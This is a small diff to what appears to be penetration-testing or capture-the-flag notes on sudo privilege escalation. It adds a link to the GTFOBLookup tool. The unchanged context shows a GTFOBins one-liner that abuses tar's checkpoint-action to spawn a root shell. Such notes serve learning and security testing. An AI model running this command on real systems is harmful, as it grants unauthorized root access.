@@ -21,6 +21,8 @@ You can only run `tar` using `sudo`. Run the command below from [GTFOBins](https
 ```ps
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
+
+➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) (0.2k ⭐) for offline browsing.
 </div></div>
 
 <hr class="sep-both">
